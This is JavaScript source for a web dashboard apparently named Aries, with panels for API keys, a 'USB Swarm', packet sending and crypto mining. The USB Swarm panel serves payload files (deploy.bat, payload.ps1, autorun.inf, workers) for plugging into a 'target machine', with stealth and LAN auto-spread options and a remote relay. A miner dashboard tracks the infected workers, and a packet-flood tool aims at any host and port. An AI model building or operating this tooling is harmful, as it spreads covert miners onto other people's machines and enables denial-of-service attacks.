  function saveAndTestKey(provider) { var input = document.getElementById('freekey-' + provider); if (!input || !input.value.trim()) return; api('POST', 'keys', { provider: provider, apiKey: input.value.trim() }).then(function() { return api('POST', 'keys/' + encodeURIComponent(provider) + '/test'); }).then(function(d) { toast(d.success ? provider + ' works!' : provider + ' failed', d.success ? 'success' : 'error'); refreshKeyVault(); refreshProviders(); }).catch(function() {}); }
  function exportKeys() { var pw = prompt('Password:') || ''; api('POST', 'keys/export', { password: pw }).then(function(d) { var a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([d.data])); a.download = 'aries-keys.json'; a.click(); }).catch(function() {}); }
  function promptImportKeys() { var input = document.createElement('input'); input.type = 'file'; input.accept = '.json'; input.onchange = function() { if (!input.files[0]) return; var reader = new FileReader(); reader.onload = function() { var pw = prompt('Password:') || ''; api('POST', 'keys/import', { data: reader.result, password: pw }).then(function() { toast('Imported!', 'success'); refreshKeyVault(); }).catch(function() {}); }; reader.readAsText(input.files[0]); }; input.click(); }

  // ═══════════════════════════════
  //  FREE KEYS PANEL
  // ═══════════════════════════════
  function loadFreeKeys() {
    var el = document.getElementById('panel-free-keys');
    if (!el) return;
    el.innerHTML = '<div class="panel-header"><h2>&#x1F511; Free API Keys</h2><button class="btn-sm" onclick="window.aries.loadFreeKeys()">&#x21BB; Refresh</button></div><div id="freeKeysGrid" class="info-content"><div class="spinner"></div> Loading...</div>';
    api('GET', 'keys/providers').then(function(d) {
      var providers = d.providers || [], grid = document.getElementById('freeKeysGrid');
      if (!providers.length) { grid.innerHTML = '<p style="color:#888">No providers.</p>'; return; }
      var html = '<p style="color:#888;font-size:13px;margin:0 0 16px">Get free API keys. Click "Signup" to register, paste key, then "Test & Save".</p>';
      html += '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px">';
      for (var i = 0; i < providers.length; i++) {
        var p = providers[i];
        html += '<div style="background:#111;border:1px solid ' + (p.hasKey ? '#0f03' : '#333') + ';border-radius:12px;padding:16px;display:flex;flex-direction:column;gap:10px">';
        html += '<div style="display:flex;justify-content:space-between">' + p.emoji + ' <strong style="color:var(--accent)">' + escapeHtml(p.label) + '</strong>' + (p.hasKey ? '<span style="color:#0f0">\u2705</span>' : '') + '</div>';
        html += '<div style="color:#888;font-size:12px">Free: ' + escapeHtml(p.freeQuota) + '</div>';
        html += '<div style="display:flex;gap:8px;flex-wrap:wrap"><a href="' + escapeHtml(p.signupUrl) + '" target="_blank" class="btn-sm" style="text-decoration:none;color:var(--accent)">Signup</a>';
        html += '<input id="fkp-' + escapeHtml(p.provider) + '" type="password" placeholder="Paste key..." style="flex:1;min-width:120px;padding:7px;background:#0a0a1a;color:#eee;border:1px solid #333;border-radius:6px;font-size:12px" />';
        html += '<button class="btn-sm" style="color:#0f0" onclick="window.aries.saveAndTestFreeKey(\'' + escapeHtml(p.provider) + '\')">Test & Save</button></div></div>';
      }
      html += '</div>';
      grid.innerHTML = html;
    }).catch(function() { document.getElementById('freeKeysGrid').innerHTML = '<p style="color:var(--red)">Failed.</p>'; });
  }
  function saveAndTestFreeKey(provider) { var input = document.getElementById('fkp-' + provider); if (!input || !input.value.trim()) return; api('POST', 'keys', { provider: provider, apiKey: input.value.trim() }).then(function() { return api('POST', 'keys/' + encodeURIComponent(provider) + '/test'); }).then(function(d) { toast(d.success ? provider + ' works!' : provider + ' failed', d.success ? 'success' : 'error'); refreshKeyVault(); refreshProviders(); loadFreeKeys(); }).catch(function() {}); }

  // ═══════════════════════════════
  //  USB SWARM
  // ═══════════════════════════════
  function handleFlipperEvent(data) {}
  function loadUsbSwarm() { loadUsbSwarmData(); }
  function loadUsbSwarmData() {
    var el = document.getElementById('usbSwarmContent'); if (!el) return;
    el.innerHTML = '<div class="spinner"></div> Loading USB Swarm...';

    Promise.all([
      api('GET', 'usb-swarm/status', null, {}).catch(function() { return { relay: null, config: {} }; }),
      api('GET', 'usb-swarm/config', null, {}).catch(function() { return {}; })
    ]).then(function(results) {
      var statusData = results[0] || {};
      var configData = results[1] || {};
      var relay = statusData.relay || {};
      var cfg = statusData.config || configData || {};
      var relayUrl = cfg.swarmRelayUrl || cfg.relayUrl || 'https://gateway.doomtrader.com:9700';
      var secret = cfg.swarmSecret || cfg.secret || '';

      var html = '';

      // ── USB Flash Tool ──
      html += '<div class="card" style="margin:0 0 20px;border:2px solid var(--accent)">';
      html += '<h3 style="margin:0 0 12px;color:var(--accent)">\u{1F4BE} One-Click USB Flash</h3>';
      html += '<div style="background:#1a0a0a;border:1px solid var(--yellow,#fa0);border-radius:8px;padding:10px;margin-bottom:12px;color:var(--yellow,#fa0);font-size:13px">\u26A0 This will ERASE all data on the selected drive</div>';
      html += '<div style="display:flex;gap:10px;align-items:end;margin-bottom:12px;flex-wrap:wrap">';
      html += '<div style="flex:1;min-width:200px"><label class="setting-label">Select USB Drive</label><select id="usbDriveSelect" class="input-field" style="width:100%;padding:8px"><option value="">-- Detecting drives... --</option></select></div>';
      html += '<button class="btn-sm" onclick="window.aries.refreshUsbDrives()" title="Refresh drives">\u21BB Refresh</button>';
      html += '</div>';
      html += '<label style="color:var(--text-dim);font-size:13px;display:flex;align-items:center;gap:6px;margin-bottom:12px"><input type="checkbox" id="usbFormatConfirm"> I understand this will format the drive</label>';
      html += '<div style="display:flex;gap:10px;align-items:center;margin-bottom:12px">';
      html += '<button id="usbFlashBtn" class="btn-primary" onclick="window.aries.flashUsb()" style="padding:10px 24px;font-size:15px;font-weight:bold">\u26A1 Flash USB</button>';
      html += '<span id="usbFlashStatus" style="font-size:13px;color:var(--text-dim)">Ready</span>';
      html += '</div>';
      html += '<div style="background:#1a1a2e;border-radius:4px;height:8px;overflow:hidden"><div id="usbFlashProgress" style="height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width 0.3s"></div></div>';
      html += '</div>';

      // ── Deployment Stats ──
      html += '<div class="panel-header"><h3>\u{1F4CA} Deployment Stats</h3></div>';
      html += '<div class="stat-row">';
      var relayStatus = relay ? (statusData.error ? '\u{1F7E1} ' + statusData.error : '\u{1F7E2} Connected') : '\u{1F534} Offline';
      html += '<div class="stat-card"><div class="stat-card-val" style="font-size:14px">' + relayStatus + '</div><div class="stat-card-label">Relay Status</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (relay.submitted || 0) + '</div><div class="stat-card-label">Submitted</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (relay.completed || 0) + '</div><div class="stat-card-label">Completed</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (relay.active || 0) + '</div><div class="stat-card-label">Active Workers</div></div>';
      html += '</div>';

      // ── Configuration ──
      html += '<div class="panel-header" style="margin-top:20px"><h3>\u2699\uFE0F Configuration</h3></div>';
      html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px">';
      html += '<div><label style="color:var(--text-dim);font-size:12px">Relay URL</label><input id="usbRelayUrl" class="input" value="' + relayUrl + '" style="width:100%;margin-top:4px"></div>';
      html += '<div><label style="color:var(--text-dim);font-size:12px">Secret</label><input id="usbSecret" class="input" type="password" value="' + secret + '" style="width:100%;margin-top:4px"></div>';
      html += '</div>';
      html += '<div style="display:flex;gap:15px;margin-bottom:15px">';
      html += '<label style="color:var(--text-dim);font-size:13px;display:flex;align-items:center;gap:6px"><input type="checkbox" id="usbStealth"> Stealth Mode</label>';
      html += '<label style="color:var(--text-dim);font-size:13px;display:flex;align-items:center;gap:6px"><input type="checkbox" id="usbAutoSpread"> Auto-Spread (scan LAN)</label>';
      html += '<button class="btn-sm" onclick="var cfg={swarmRelayUrl:document.getElementById(\u0027usbRelayUrl\u0027).value,swarmSecret:document.getElementById(\u0027usbSecret\u0027).value,stealth:document.getElementById(\u0027usbStealth\u0027).checked,autoSpread:document.getElementById(\u0027usbAutoSpread\u0027).checked};api(\u0027POST\u0027,\u0027usb-swarm/config\u0027,cfg).then(function(){toast(\u0027Config saved\u0027,\u0027success\u0027)}).catch(function(){toast(\u0027Save failed\u0027,\u0027error\u0027)})">\u{1F4BE} Save Config</button>';
      html += '</div>';

      // ── Download Buttons ──
      html += '<div class="panel-header" style="margin-top:20px"><h3>\u{1F4E5} Download USB Package</h3></div>';
      html += '<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:15px">';
      html += '<a href="/api/usb-swarm/deploy.bat" download class="btn-primary" style="text-decoration:none">\u{1F4E6} deploy.bat</a>';
      html += '<a href="/api/usb-swarm/payload.ps1" download class="btn-primary" style="text-decoration:none">\u{1F4E6} payload.ps1</a>';
      html += '<a href="/api/usb-swarm/worker.js" download class="btn-primary" style="text-decoration:none">\u{1F4E6} worker.js</a>';
      html += '<a href="/api/usb-swarm/autorun.inf" download class="btn-primary" style="text-decoration:none">\u{1F4E6} autorun.inf</a>';
      html += '<a href="/api/usb-swarm/deploy-gcp.sh" download class="btn-primary" style="text-decoration:none">\u{1F427} deploy-gcp.sh (Linux)</a>';
      html += '<a href="/api/usb-swarm/worker-linux.js" download class="btn-primary" style="text-decoration:none">\u{1F427} worker-linux.js</a>';
      html += '</div>';

      // ── Quick Setup Instructions ──
      html += '<div class="panel-header" style="margin-top:20px"><h3>\u{1F4CB} Quick Setup</h3></div>';
      html += '<div style="background:var(--card-bg,#1a1a2e);border-radius:8px;padding:12px;margin-bottom:15px;font-size:13px;line-height:1.8">';
      html += '<strong>Step 1:</strong> Format USB drive (FAT32 or NTFS)<br>';
      html += '<strong>Step 2:</strong> Download all files above and copy to USB root<br>';
      html += '<strong>Step 3:</strong> Plug USB into target machine<br>';
      html += '<strong>Step 4:</strong> Run <code style="background:var(--bg);padding:2px 6px;border-radius:3px">deploy.bat</code> (or it auto-runs via autorun.inf on older systems)';
      html += '</div>';

      // ── File Previews ──
      html += '<div class="panel-header" style="margin-top:20px"><h3>\u{1F4C4} File Contents</h3></div>';

      var fileNames = ['deploy.bat', 'payload.ps1', 'autorun.inf'];
      var fileEndpoints = ['usb-swarm/deploy.bat', 'usb-swarm/payload.ps1', 'usb-swarm/autorun.inf'];

      for (var i = 0; i < fileNames.length; i++) {
        html += '<div style="margin-bottom:10px">';
        html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">';
        html += '<span style="color:var(--text-dim);font-size:12px;font-weight:bold">' + fileNames[i] + '</span>';
        html += '<button class="btn-sm" onclick="var ta=this.parentElement.nextElementSibling;navigator.clipboard.writeText(ta.value);toast(\u0027Copied!\u0027,\u0027success\u0027)">\u{1F4CB} Copy</button>';
        html += '</div>';
        html += '<textarea id="usbFile_' + i + '" readonly style="width:100%;height:80px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;font-family:monospace;font-size:11px;resize:vertical">Loading...</textarea>';
        html += '</div>';
      }

      // ── File paths ──
      html += '<div style="margin-top:10px;font-size:12px;color:var(--text-dim)">';
      html += '<strong>Other files:</strong><br>';
      html += '\u{1F4C1} usb-swarm/worker.js - Main Windows worker<br>';
      html += '\u{1F4C1} usb-swarm/worker-linux.js - Linux worker<br>';
      html += '\u{1F4C1} usb-swarm/deploy-gcp.sh - GCP/Linux deploy script';
      html += '</div>';

      el.innerHTML = html;

      // Load file contents into textareas
      var endpoints = ['usb-swarm/deploy.bat', 'usb-swarm/payload.ps1', 'usb-swarm/autorun.inf'];
      for (var j = 0; j < endpoints.length; j++) {
        (function(idx) {
          fetch('/api/' + endpoints[idx]).then(function(r) { return r.text(); }).then(function(txt) {
            var ta = document.getElementById('usbFile_' + idx);
            if (ta) ta.value = txt;
          }).catch(function() {
            var ta = document.getElementById('usbFile_' + idx);
            if (ta) ta.value = 'Failed to load';
          });
        })(j);
      }
      // Auto-load USB drives
      refreshUsbDrives();
    }).catch(function() {
      el.innerHTML = '<p style="color:var(--text-dim)">USB Swarm not available.</p>';
    });
  }

  function refreshUsbDrives() {
    var sel = document.getElementById('usbDriveSelect');
    if (!sel) return;
    sel.innerHTML = '<option value="">-- Scanning... --</option>';
    api('GET', 'usb/drives', null, {}).then(function(drives) {
      if (!drives || !drives.length) { sel.innerHTML = '<option value="">-- No USB drives found --</option>'; return; }
      sel.innerHTML = '<option value="">-- Select a drive --</option>';
      drives.forEach(function(d) {
        var opt = document.createElement('option');
        opt.value = d.drive;
        opt.textContent = d.drive + ' ' + (d.label || 'No Label') + ' (' + (d.size || '?') + ', ' + (d.filesystem || '?') + ')';
        sel.appendChild(opt);
      });
    }).catch(function() {
      sel.innerHTML = '<option value="">-- Detection failed --</option>';
    });
  }

  function flashUsb() {
    var sel = document.getElementById('usbDriveSelect');
    var confirm = document.getElementById('usbFormatConfirm');
    var statusEl = document.getElementById('usbFlashStatus');
    var progressEl = document.getElementById('usbFlashProgress');
    var btn = document.getElementById('usbFlashBtn');
    if (!sel || !sel.value) { toast('Select a USB drive first', 'error'); return; }
    if (!confirm || !confirm.checked) { toast('Please confirm you understand the drive will be formatted', 'error'); return; }
    btn.disabled = true;
    statusEl.textContent = 'Formatting...';
    progressEl.style.width = '10%';
    api('POST', 'usb/flash', { drive: sel.value }).then(function(r) {
      progressEl.style.width = '100%';
      statusEl.textContent = 'Done \u2713 - ' + (r.files ? r.files.length + ' files copied' : 'Complete');
      statusEl.style.color = 'var(--green, #0f0)';
      btn.disabled = false;
      toast('USB flashed successfully!', 'success');
    }).catch(function(e) {
      progressEl.style.width = '0%';
      statusEl.textContent = 'Error: ' + (e.message || 'Flash failed');
      statusEl.style.color = 'var(--red, #f44)';
      btn.disabled = false;
      toast('USB flash failed: ' + (e.message || 'Unknown error'), 'error');
    });
  }

  // ═══════════════════════════════
  //  PACKET SEND
  // ═══════════════════════════════
  var _pktRefreshInterval = null;
  function loadPacketSend() { refreshPacketStats(); }
  function startPacketSend() {
    var target = document.getElementById('pktTarget').value.trim(); if (!target) { toast('Enter target', 'error'); return; }
    document.getElementById('pktStartBtn').style.display = 'none'; document.getElementById('pktStopBtn').style.display = 'inline-block'; document.getElementById('pktStatsArea').style.display = 'block';
    api('POST', 'packet-send/start', { target: target, port: parseInt(document.getElementById('pktPort').value) || 80, protocol: document.getElementById('pktProtocol').value, packetSize: parseInt(document.getElementById('pktSize').value) || 512, duration: parseInt(document.getElementById('pktDuration').value) || 30 }).then(function() { toast('Started!', 'success'); _pktRefreshInterval = setInterval(refreshPacketStats, 1000); }).catch(function() { document.getElementById('pktStartBtn').style.display = 'inline-block'; document.getElementById('pktStopBtn').style.display = 'none'; });
  }
  function stopPacketSend() { api('POST', 'packet-send/stop').then(function() { toast('Stopped', 'info'); if (_pktRefreshInterval) { clearInterval(_pktRefreshInterval); _pktRefreshInterval = null; } document.getElementById('pktStartBtn').style.display = 'inline-block'; document.getElementById('pktStopBtn').style.display = 'none'; }).catch(function() {}); }
  function refreshPacketStats() { api('GET', 'packet-send/status', null, {}).then(function(d) { if (!d.active && _pktRefreshInterval) { clearInterval(_pktRefreshInterval); _pktRefreshInterval = null; document.getElementById('pktStartBtn').style.display = 'inline-block'; document.getElementById('pktStopBtn').style.display = 'none'; } var pct = d.duration > 0 ? Math.min(100, Math.round((d.elapsed / d.duration) * 100)) : 0; var fill = document.getElementById('pktProgressFill'); if (fill) fill.style.width = pct + '%'; var agg = d.aggregate || {}, aggEl = document.getElementById('pktAggregateStats'); if (aggEl) aggEl.innerHTML = '<div class="stat-card"><div class="stat-card-val">' + (agg.packetsPerSec || 0) + '</div><div class="stat-card-label">Pkt/sec</div></div><div class="stat-card"><div class="stat-card-val">' + (agg.totalPackets || 0) + '</div><div class="stat-card-label">Total</div></div>'; }).catch(function() {}); }
  function refreshPacketSend() { refreshPacketStats(); }

  // ═══════════════════════════════
  //  BTC MINER DASHBOARD v2
  // ═══════════════════════════════
  var _minerRefreshTimer = null;
  var _minerStartTime = null;
  var _minerUptimeTimer = null;
  var _minerIntensity = 'medium';

  function fmtHashrate(h) {
    if (typeof h === 'string') return h;
    if (!h || h === 0) return '0 H/s';
    if (h >= 1e9) return (h / 1e9).toFixed(2) + ' GH/s';
    if (h >= 1e6) return (h / 1e6).toFixed(2) + ' MH/s';
    if (h >= 1e3) return (h / 1e3).toFixed(2) + ' KH/s';
    return h.toFixed(1) + ' H/s';
  }

  function fmtUptime(seconds) {
    if (!seconds || seconds <= 0) return '--';
    var d = Math.floor(seconds / 86400), h = Math.floor((seconds % 86400) / 3600);
    var m = Math.floor((seconds % 3600) / 60), s = Math.floor(seconds % 60);
    if (d > 0) return d + 'd ' + h + 'h ' + m + 'm';
    if (h > 0) return h + 'h ' + m + 'm ' + s + 's';
    return m + 'm ' + s + 's';
  }

  function dotClass(status) {
    if (status === 'mining' || status === 'connected' || status === 'online') return 'green';
    if (status === 'starting' || status === 'connecting') return 'yellow';
    return 'red';
  }

  // ── Hashrate History + Chart ──
  var _hashrateHistory = [];
  var _hashrateMaxPoints = 60;

  function pushHashratePoint(hr) {
    _hashrateHistory.push({ t: Date.now(), v: hr || 0 });
    if (_hashrateHistory.length > _hashrateMaxPoints) _hashrateHistory.shift();
  }

  function drawHashrateChart() {
    var canvas = document.getElementById('hashrateChart');
    if (!canvas) return;
    var ctx = canvas.getContext('2d');
    var w = canvas.width = canvas.parentElement.clientWidth || 600;
    var h = canvas.height = 160;
    ctx.clearRect(0, 0, w, h);
    // Background
    ctx.fillStyle = '#0a0a1a';
    ctx.fillRect(0, 0, w, h);
    // Grid lines
    ctx.strokeStyle = 'rgba(0,255,255,0.08)';
    ctx.lineWidth = 1;
    for (var gi = 1; gi < 4; gi++) {
      var gy = h * gi / 4;
      ctx.beginPath(); ctx.moveTo(0, gy); ctx.lineTo(w, gy); ctx.stroke();
    }
    if (_hashrateHistory.length < 2) {
      ctx.fillStyle = 'rgba(0,255,255,0.3)';
      ctx.font = '13px monospace';
      ctx.textAlign = 'center';
      ctx.fillText('Collecting data...', w / 2, h / 2);
      return;
    }
    var maxVal = 0;
    for (var mi = 0; mi < _hashrateHistory.length; mi++) { if (_hashrateHistory[mi].v > maxVal) maxVal = _hashrateHistory[mi].v; }
    if (maxVal === 0) maxVal = 1;
    var padTop = 20, padBot = 25, padLeft = 50, padRight = 10;
    var plotW = w - padLeft - padRight, plotH = h - padTop - padBot;
    // Y-axis labels
    ctx.fillStyle = 'rgba(0,255,255,0.5)';
    ctx.font = '10px monospace';
    ctx.textAlign = 'right';
    for (var yi = 0; yi <= 3; yi++) {
      var yVal = maxVal * (3 - yi) / 3;
      var yPos = padTop + plotH * yi / 3;
      ctx.fillText(yVal >= 1000 ? (yVal / 1000).toFixed(1) + 'K' : yVal.toFixed(0), padLeft - 4, yPos + 3);
    }
    // X-axis labels
    ctx.textAlign = 'center';
    var tStart = _hashrateHistory[0].t, tEnd = _hashrateHistory[_hashrateHistory.length - 1].t;
    for (var xi = 0; xi <= 4; xi++) {
      var xt = tStart + (tEnd - tStart) * xi / 4;
      var xPos = padLeft + plotW * xi / 4;
      var d = new Date(xt);
      ctx.fillText(d.getMinutes().toString().padStart(2, '0') + ':' + d.getSeconds().toString().padStart(2, '0'), xPos, h - 5);
    }
    // Line
    ctx.beginPath();
    ctx.strokeStyle = '#00ffff';
    ctx.lineWidth = 2;
    ctx.shadowColor = '#00ffff';
    ctx.shadowBlur = 8;
    for (var li = 0; li < _hashrateHistory.length; li++) {
      var lx = padLeft + plotW * li / (_hashrateHistory.length - 1);
      var ly = padTop + plotH * (1 - _hashrateHistory[li].v / maxVal);
      if (li === 0) ctx.moveTo(lx, ly); else ctx.lineTo(lx, ly);
    }
    ctx.stroke();
    ctx.shadowBlur = 0;
    // Fill under line
    ctx.lineTo(padLeft + plotW, padTop + plotH);
    ctx.lineTo(padLeft, padTop + plotH);
    ctx.closePath();
    ctx.fillStyle = 'rgba(0,255,255,0.06)';
    ctx.fill();
    // Label
    ctx.fillStyle = 'rgba(0,255,255,0.4)';
    ctx.font = '10px monospace';
    ctx.textAlign = 'left';
    ctx.fillText('H/s', padLeft + 4, padTop - 6);
  }

  function buildLeaderboardHtml(nodes) {
    if (!nodes || nodes.length === 0) return '';
    var sorted = nodes.slice().sort(function(a, b) {
      var sa = (a.sharesAccepted || a.accepted || 0), sb = (b.sharesAccepted || b.accepted || 0);
      if (sb !== sa) return sb - sa;
      return (b.hashrate || 0) - (a.hashrate || 0);
    });
    var medals = ['\u{1F947}', '\u{1F948}', '\u{1F949}'];
    var html = '<div class="miner-section"><h4>\u{1F3C6} Worker Leaderboard</h4>';
    html += '<table class="data-table"><thead><tr><th>Rank</th><th>Hostname</th><th>Hashrate</th><th>Shares</th><th>Uptime</th></tr></thead><tbody>';
    for (var i = 0; i < sorted.length; i++) {
      var n = sorted[i];
      var rank = i < 3 ? medals[i] : '#' + (i + 1);
      html += '<tr><td>' + rank + '</td><td style="color:var(--accent)">' + escapeHtml(n.hostname || 'Worker') + '</td><td>' + fmtHashrate(n.hashrate) + '</td><td style="color:var(--green)">' + (n.sharesAccepted || n.accepted || 0) + '</td><td>' + (n.uptime ? fmtUptime(n.uptime) : '--') + '</td></tr>';
    }
    html += '</tbody></table></div>';
    return html;
  }

  function loadBtcMiner() {
    if (_minerRefreshTimer) clearInterval(_minerRefreshTimer);
    if (_minerUptimeTimer) clearInterval(_minerUptimeTimer);
    var el = document.getElementById('btcMinerContent'); if (!el) return;
    el.innerHTML = '<div class="spinner"></div> Loading mining dashboard...';
    Promise.all([
      api('GET', 'miner/config').catch(function() { return { config: {} }; }),
      api('GET', 'miner/status').catch(function() { return { mining: false, nodes: [] }; }),
      api('GET', 'miner/pnl').catch(function() { return { totalBtcMined: 0, totalUsd: 0 }; }),
      api('GET', 'miner/profitability').catch(function() { return {}; }),
      api('GET', 'miner/pools').catch(function() { return { pools: [] }; }),
      api('GET', 'usb-swarm/status').catch(function() { return { connected: false, nodes: [] }; })
    ]).then(function(results) {
      var cfg = results[0].config || results[0] || {};
      var status = results[1] || {};
      var pnl = results[2] || {};
      var profit = results[3] || {};
      var pools = (results[4].pools || results[4] || []);
      if (!Array.isArray(pools)) pools = [];
      var swarm = results[5] || {};
      var mining = status.mining || false;
      var nodes = status.nodes || [];
      var swarmNodes = swarm.nodes || swarm.workers || [];
      _minerIntensity = cfg.intensity || 'medium';
      if (mining && status.startedAt) _minerStartTime = new Date(status.startedAt).getTime();
      else if (mining && !_minerStartTime) _minerStartTime = Date.now();
      else if (!mining) _minerStartTime = null;

      var totalWorkers = nodes.length;
      var activeWorkers = 0;
      for (var i = 0; i < nodes.length; i++) { if (nodes[i].status === 'mining') activeWorkers++; }
      var dailySol = (profit.estimatedDaily ? profit.estimatedDaily.sol : 0) || profit.dailySol || profit.estimatedDailySol || 0;
      var dailyUsd = (profit.estimatedDaily ? profit.estimatedDaily.usd : 0) || profit.dailyUsd || profit.estimatedDailyUsd || 0;
      var solPrice = profit.solPrice || 0;
      var poolName = cfg.pool || (pools.length > 0 ? pools[0].name : 'Default');
      var poolUrl = cfg.poolUrl || (pools.length > 0 ? pools[0].url : '');
      var poolConnected = status.poolConnected !== undefined ? status.poolConnected : mining;

      var html = '<div class="miner-dash' + (mining ? ' miner-mining' : '') + '">';

      // ── Top Stats Bar ──
      html += '<div class="miner-stats-bar">';
      var totalThreads = 0; for (var ti = 0; ti < nodes.length; ti++) totalThreads += (nodes[ti].threads || 0);
      html += '<div class="miner-stat-tile"><div class="mst-label">Total Hashrate</div><div class="mst-val gold" id="minerHashVal">' + fmtHashrate(status.totalHashrate || status.hashrate) + '</div><div class="mst-sub" id="minerHashSub">' + totalThreads + ' thread' + (totalThreads !== 1 ? 's' : '') + ' · ' + totalWorkers + ' node' + (totalWorkers !== 1 ? 's' : '') + '</div></div>';
      html += '<div class="miner-stat-tile"><div class="mst-label">Active Workers</div><div class="mst-val">' + activeWorkers + '<span style="color:var(--text-dim);font-size:14px"> / ' + totalWorkers + '</span></div><div class="mst-sub"><span class="miner-dot ' + (activeWorkers > 0 ? 'green' : 'red') + '"></span>' + (activeWorkers > 0 ? 'Mining' : 'Idle') + '</div></div>';
      html += '<div class="miner-stat-tile"><div class="mst-label">Est. Daily Earnings</div><div class="mst-val green">' + dailySol.toFixed(6) + ' SOL</div><div class="mst-sub">≈ $' + dailyUsd.toFixed(4) + ' USD' + (solPrice > 0 ? ' · SOL $' + solPrice.toFixed(0) : '') + '</div></div>';
      html += '<div class="miner-stat-tile"><div class="mst-label">Pool Status</div><div class="mst-val" style="font-size:16px"><span class="miner-dot ' + (poolConnected ? 'green' : 'red') + '"></span>' + escapeHtml(poolName) + '</div><div class="mst-sub">' + (poolConnected ? 'Connected' : 'Disconnected') + '</div></div>';
      html += '<div class="miner-stat-tile"><div class="mst-label">Uptime</div><div class="mst-val" id="minerUptimeVal">' + (mining && _minerStartTime ? fmtUptime((Date.now() - _minerStartTime) / 1000) : '--') + '</div><div class="mst-sub">' + (mining ? 'Running' : 'Stopped') + '</div></div>';
      html += '</div>';

      // ── FEATURE 4: Wallet Balance ──
      html += '<div id="walletBalanceBar" style="display:flex;gap:16px;align-items:center;padding:10px 16px;background:linear-gradient(90deg,rgba(0,255,136,0.05),rgba(0,255,255,0.05));border:1px solid rgba(0,255,136,0.15);border-radius:8px;margin-bottom:16px;font-size:13px">';
      html += '<span style="color:#0f08;text-transform:uppercase;font-size:11px;letter-spacing:1px">Wallet</span>';
      html += '<span id="walletSolBal" style="color:#0f0;font-weight:700">Loading...</span>';
      html += '<span id="walletUsdBal" style="color:#0f08">—</span>';
      html += '<span id="walletTrend" style="font-size:16px">—</span>';
      html += '</div>';

      // ── FEATURE 2: Hashrate Graph with Sparkline Stats ──
      html += '<div class="miner-section" style="margin-bottom:16px"><h4 style="margin:0 0 8px">\u{1F4C8} Hashrate (Last 60s)</h4>';
      html += '<div style="display:flex;gap:24px;margin-bottom:8px;font-size:12px">';
      html += '<div><span style="color:#0ff8">Current:</span> <span id="sparkCurrent" style="color:#0ff;font-weight:700">—</span></div>';
      html += '<div><span style="color:#0ff8">Average:</span> <span id="sparkAvg" style="color:#0ff;font-weight:700">—</span></div>';
      html += '<div><span style="color:#0ff8">Peak:</span> <span id="sparkPeak" style="color:#0ff;font-weight:700">—</span></div>';
      html += '</div>';
      html += '<canvas id="hashrateChart" style="width:100%;height:160px;border:1px solid rgba(0,255,255,0.15);border-radius:8px"></canvas></div>';

      // ── Controls Row ──
      html += '<div class="miner-controls">';
      // Big toggle
      html += '<div class="miner-ctrl-card miner-big-toggle">';
      html += '<label class="miner-toggle"><input type="checkbox" id="minerToggle" ' + (mining ? 'checked' : '') + ' onchange="window.aries.toggleMining(this.checked)" /><span class="slider"></span></label>';
      html += '<div class="mbt-label" style="color:' + (mining ? 'var(--green)' : 'var(--red)') + '">' + (mining ? '⛏ MINING' : '■ STOPPED') + '</div>';
      html += '</div>';
      // Config
      html += '<div class="miner-ctrl-card" style="flex:2">';
      html += '<h4>⚙ Configuration</h4>';
      html += '<div class="miner-cfg-row">';
      html += '<div><label>SOL Wallet</label><input id="minerWallet" type="text" class="input-field" style="font-family:monospace" placeholder="SOL address..." value="' + escapeHtml(cfg.wallet || '') + '" /></div>';
      html += '<div><label>Threads</label><input id="minerThreads" type="number" class="input-field" value="' + (cfg.threads || 2) + '" min="1" /></div>';
      html += '<div><label>Action</label><button class="btn-primary" onclick="window.aries.saveMinerConfig()" style="width:100%;margin-top:0;padding:8px">Save</button></div>';
      html += '</div>';
      html += '<div style="margin-top:12px"><label style="font-size:11px;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.5px;display:block;margin-bottom:4px">Intensity</label>';
      html += '<div class="miner-intensity-bar">';
      var intensities = ['low', 'medium', 'high', 'max'];
      for (var ii = 0; ii < intensities.length; ii++) {
        html += '<button onclick="window.aries.setMinerIntensity(\'' + intensities[ii] + '\')" class="' + (intensities[ii] === _minerIntensity ? 'active' : '') + '" data-intensity="' + intensities[ii] + '">' + intensities[ii].charAt(0).toUpperCase() + intensities[ii].slice(1) + '</button>';
      }
      html += '</div></div>';
      html += '</div>';
      html += '</div>';

      // ── Worker Grid ──
      html += '<div class="miner-section"><h4>🖥 Workers</h4>';
      if (nodes.length === 0) {
        html += '<div class="miner-empty"><div class="miner-empty-icon">⛏</div>No workers connected.<br><span style="font-size:12px;margin-top:8px;display:inline-block">Deploy swarm workers to start mining across multiple machines.</span></div>';
      } else {
        html += '<div class="miner-worker-grid" id="minerWorkerGrid">';
        for (var wi = 0; wi < nodes.length; wi++) {
          var w = nodes[wi];
          var isLocal = w.local || w.hostname === 'localhost' || wi === 0;
          html += '<div class="miner-worker-card' + (isLocal ? ' local' : '') + '">';
          html += '<div class="mwc-header"><span class="miner-dot ' + dotClass(w.status) + '"></span><span class="mwc-hostname">' + escapeHtml(w.hostname || 'Worker ' + (wi + 1)) + '</span>';
          if (isLocal) html += '<span class="mwc-tag">Local</span>';
          else if (w.region) html += '<span class="mwc-tag">' + escapeHtml(w.region) + '</span>';
          html += '</div>';
          html += '<div class="mwc-hashrate">' + fmtHashrate(w.hashrate) + '</div>';
          html += '<dl class="mwc-stats">';
          if (w.cpu) html += '<dt>CPU</dt><dd>' + escapeHtml(w.cpu) + '</dd>';
          html += '<dt>Threads</dt><dd>' + (w.threads || cfg.threads || '?') + '</dd>';
          html += '<dt>Accepted</dt><dd style="color:var(--green)">' + (w.accepted || 0) + '</dd>';
          html += '<dt>Rejected</dt><dd style="color:var(--red)">' + (w.rejected || 0) + '</dd>';
          if (w.uptime) html += '<dt>Uptime</dt><dd>' + fmtUptime(w.uptime) + '</dd>';
          html += '</dl></div>';
        }
        html += '</div>';
      }
      html += '</div>';

      // ── Worker Leaderboard ──
      html += buildLeaderboardHtml(nodes);

      // ── Push Update Button ──
